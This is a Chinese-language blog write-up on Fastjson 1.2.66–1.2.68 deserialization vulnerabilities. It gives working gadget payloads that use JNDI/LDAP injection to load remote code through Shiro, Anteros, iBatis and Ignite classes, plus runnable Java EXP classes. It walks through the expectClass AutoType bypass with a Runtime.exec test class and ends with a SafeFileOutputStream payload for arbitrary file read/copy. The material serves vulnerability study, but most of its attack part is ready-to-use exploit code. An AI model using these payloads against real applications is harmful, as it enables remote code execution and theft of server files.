<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, cacheClass);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vwjWL">补丁</h3>
黑名单绕过的补丁都是在新版本中向hash黑名单中添加相应的hash

<p>新版本运行后会抛出以下异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png"></p>
<h2 id="iFdOH">1.2.66 反序列化漏洞</h2>
1.2.66 反序列化，有着三条Gadget，其原理都为JNDI注入，也需要服务端存在其他依赖

<h3 id="Z4itN">1.2.66反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.66；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
</ul>
<h3 id="edTnh">Gadget's POC</h3>
<h4 id="LH9SG">org.apache.shiro.realm.jndi.JndiRealmFactory</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png"></p>
<h4 id="x7M85">br.com.anteros.dbcp.AnterosDBCPConfig</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">或</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SRgjI">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="KVFVy">EXP</h3>
EXP如下，记得开启AutoTypeSupport

<p>这几个Gadget都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1266</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="yVPEG">1.2.67反序列化漏洞</h2>
<h3 id="lOtJF">1.2.67反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.67；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
</ul>
<h3 id="gTkXQ">Fastjson循环引用</h3>
Fastjson支持循环引用，且默认开启

<p>参考如下</p>
<p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p>
<p>在Fastjson中，向JsonArray类型的对象里面add数据时，如果数据相同，那么就会被替换成$ref，相当于定义了一下以便简化，因为数据也是一样的</p>
<p>$ref即循环引用：当一个对象包含另一个对象时，Fastjson会将$ref解析成引用</p>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$”}</font></td>
<td align="center">引用根对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”@”}</font></td>
<td align="center">引用自己</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..”}</font></td>
<td align="center">引用父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..&#x2F;..”}</font></td>
<td align="center">引用父对象的父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$.members[0].reportTo”}</font></td>
<td align="center"><font style="color:rgb(51, 51, 51);">基于路径的引用</font></td>
</tr>
</tbody></table>
<p>那这样就清楚了，org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC中后面那段的{“$ref”:”$.tm”}，实际上就是基于路径的引用，相当于是调用root.getTm()函数，进而直接调用了tm字段的getter方法了</p>
<h3 id="xOPlY">Gadget's POC</h3>
<h4 id="AzrMp">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="QCent">org.apache.shiro.jndi.JndiObjectFactory</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sxkNl">EXP</h3>
EXP如下，其实并没有什么差别，还是那句话，记得开启AutoTypeSupport

<p>这几个Gadget也都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1267</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pJcT1">1.2.68反序列化漏洞（expectClass绕过AutoType）</h2>
<h3 id="adqSF">1.2.68反序列化前提条件</h3>

<ul>
<li>Fastjson &lt;&#x3D; 1.2.68</li>
<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中</li>
</ul>
<h3 id="JLOJQ">绕过</h3>
<h4 id="b7fNW">绕过原理</h4>
本次绕过的关键处在于`checkAutoType()`的第二个参数expectClass，我们可以通过构造恶意JSON数据、传入某个类作为exceptClass参数在传入另一个exceptClass的子类或者实现类来实现绕过`checkAutoType()`函数执行恶意操作

<p><strong>步骤如下:</strong></p>
<ul>
<li>先传入某个类，其加载成功后作为exceptClass参数传入<code>checkAutoType</code>函数</li>
<li>查找exceptClass类的实现类或者子类，如果在子类或者实现类中其构造方法或者setter方法中存在危险操作即可利用</li>
</ul>
<h4 id="sFO75">可行性测试</h4>
简单测试一下该绕过方法的可行性

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExcept</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FastjsonExcept</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        rt.exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.FastjsonExcept&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在无需AutoType的情况下，即可执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png"></p>
<h4 id="bmimq">断点调试</h4>
我们直接在`checkAutoType`下断点调试

<p>第一次转入的类是<code>AutoCloseable</code>进行校验，这里我们可以看到expectClass为null</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png"></p>
<p>然后从缓存Mapping中直接获取到<code>AutoCloseable</code>，然后对获取的clazz进行了一系列的判断，判断clazz是不是null，以及internalWhite的判断，internalWhite里面的白名单一定是很安全的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png"></p>
<p>后续会出现对expectClass的判断，判断expectClass是否为空，且判断它是否继承HashMap类，若满足情况，则抛出异常，反之则会返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>回到<code>DefaultJSONParser</code>后，获取到clazz后再继续执行，根据<code>AutoCloseable</code>类获取到反序列化器为<code>JavaBeanDeserializer</code>使用该反序列化器进行反序列化操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png"></p>
<p>继续往里面走，调用<code>JavaBeanDeserializer</code>的<code>deserialze</code>方法，传入的第二个参数type即为<code>AutoCloseable</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png"></p>
<p>往下面的逻辑，就是解析后面类的过程。这里看到获取不到对象反序列化器后，就会进入到if的判断中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png"></p>
<p>这次我们第二次进入<code>checkAutoType</code>方法，typeName是我们POC中的第二个类，exceptClass参数是POC中指定的第一个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png"></p>
<p>因为<code>AutoCloseable</code>并不是黑名单中的类，所以expectClassFlag被设置为true</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png"></p>
<p>最后走到我们刚刚说的地方，当这个类不在白名单，且autoType开启或者expectClassFlag为true时，即可进入Auto开启时的检测逻辑</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png"></p>
<p>往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png"></p>
<p>跟进该函数中，这里使用<code>AppClassLoader</code>加载 <code>VulAutoCloseable</code> 类并直接返回</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png"></p>
<p>往下，判断其是否为jsonType，若true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常</p>
<p>这也是过滤大多数JNDI注入Gadget的机制</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png"></p>
<p>最重点的是以下部分，这里当expectClass不为null时，就会判断我们的clazz是否为expectClass的子类，若它继承与expectClass的话，就会被添加到Mapping缓存中并返回该目标类，反之则抛出异常</p>
<p>这里解释的我们的恶意类必须要继承自expectClass类，只有目标类是expectClass类的子类时，才能通过这里的判断，后续反序列化即可造成恶意代码的执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png"></p>
<h4 id="BWFH9">小结</h4>
> 在我们的POC中定义了两个`@type`
>

<p>第一个type进去什么事情都没有发生，它是作为第二个type类的expectClass传入的，而当第二个type类为第一个type的继承类，且他的setter&#x2F;getter或构造方法中存在危险方法时，即可被我们利用</p>
<h3 id="R1wmY">实际利用</h3>
我实在太菜了，不会自己寻找gadget，这里就直接从别的师傅那里看存在漏洞的地方了 嘤嘤嘤

<p>找到的是IntputStream和OutputStream，他们都是实现自AutoCloseable接口的</p>
<h4 id="h09Z1">复制文件（任意文件读取）</h4>
利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看一下<code>SafeFileOutputStream</code>的源代码，在他的构造函数<code>public SafeFileOutputStream(String targetPath, String tempPath)</code>中，若targetPath文件不存在，且tempPath文件存在，就会把tempPath复制到targetPath中</p>
<p>利用其构造函数，我们可以实现特定web场景下的任意文件读取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.eclipse.core.internal.localstore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.utils.FileUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    ((OutputStream)destination).close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var3;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据原理来写一个POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;C://windows/win.ini\&quot;,\&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

